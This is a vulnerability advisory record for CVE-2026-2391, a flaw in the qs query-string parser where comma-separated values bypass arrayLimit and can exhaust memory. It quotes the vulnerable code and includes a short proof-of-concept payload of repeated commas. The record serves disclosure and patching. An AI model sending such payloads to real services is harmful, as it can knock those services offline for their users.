advisory_id: CVE-2026-2391
datasource_id: vulnrichment_importer_v2/CVE-2026-2391
datasource_url: https://github.com/cisagov/vulnrichment/blob/develop/2026/2xxx/CVE-2026-2391.json
aliases: []
summary: |
  ### Summary
  The `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).

  ### Details
  When the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.

  **Vulnerable code** (lib/parse.js: lines ~40-50):
  ```js
  if (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {
      return val.split(',');
  }

  if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {
      throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');
  }

  return val;
  ```
  The `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).

  ### PoC
  **Test 1 - Basic bypass:**
  ```
  npm install qs
  ```

  ```js
  const qs = require('qs');

  const payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)
  const options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };

  try {
    const result = qs.parse(payload, options);
    console.log(result.a.length);  // Outputs: 26 (bypass successful)
  } catch (e) {
    console.log('Limit enforced:', e.message);  // Not thrown
  }
  ```
  **Configuration:**
  - `comma: true`
  - `arrayLimit: 5`
  - `throwOnLimitExceeded: true`

  Expected: Throws "Array limit exceeded" error.
  Actual: Parses successfully, creating an array of length 26.


  ### Impact
  Denial of Service (DoS) via memory exhaustion.
impacted_packages: []
severities:
  - score: '3.7'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L
    published_at: None
    url:
  - score: '6.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N
    published_at: None
    url:
  - score: Track
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2026-02-12T15:00:21Z/
    published_at: None
    url:
weaknesses:
  - CWE-20
references:
  - url: https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482
    reference_type:
    reference_id:
  - url: https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883
    reference_type:
    reference_id:
